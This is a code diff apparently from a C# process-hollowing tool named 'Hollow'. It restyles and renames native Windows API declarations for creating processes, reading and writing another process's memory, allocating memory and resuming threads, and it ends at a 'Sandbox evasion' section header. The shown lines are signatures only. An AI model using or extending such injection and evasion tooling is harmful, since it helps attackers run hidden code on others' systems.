@@ -539,7 +539,10 @@ namespace Hollow
         }
 
         [DllImport("NtDll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
+        public static extern void RtlInitUnicodeString(
+            ref UNICODE_STRING DestinationString, 
+            [MarshalAs(UnmanagedType.LPWStr)] string SourceString
+            );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate NTSTATUS NtCreateUserProcess(
@@ -572,16 +575,56 @@ namespace Hollow
             );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public delegate int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref Win32.PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+        public delegate int NtQueryInformationProcess(
+            IntPtr hProcess, 
+            int procInformationClass, 
+            ref Win32.PROCESS_BASIC_INFORMATION procInformation, 
+            uint ProcInfoLen, 
+            ref uint retlen
+            );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public delegate bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        public delegate NTSTATUS NtReadVirtualMemory(
+            IntPtr hProcess, 
+            IntPtr lpBaseAddress, 
+            byte[] lpBuffer, 
+            uint dwSize, 
+            ref uint lpNumberOfBytesRead
+            );
+
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        public delegate NTSTATUS WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            IntPtr lpBuffer,
+            uint nSize,
+            ref uint lpNumberOfBytesWritten
+            );
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        public delegate uint ResumeThread(IntPtr hThread);
+        public delegate NTSTATUS NtWriteVirtualMemory(
+            IntPtr hProcess, 
+            IntPtr lpBaseAddress, 
+            IntPtr lpBuffer, 
+            uint nSize, 
+            ref uint lpNumberOfBytesWritten
+            );
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        public delegate NTSTATUS NtResumeThread(
+            IntPtr hThread,
+            ref uint count
+            );
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        public delegate uint NtAllocateVirtualMemory(
+            IntPtr hProcess, 
+            ref IntPtr lpBaseAddress, 
+            uint zb, 
+            ref uint regionSize, 
+            uint allocType, 
+            uint oldProtect);
 
         //Sandbox evasion
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
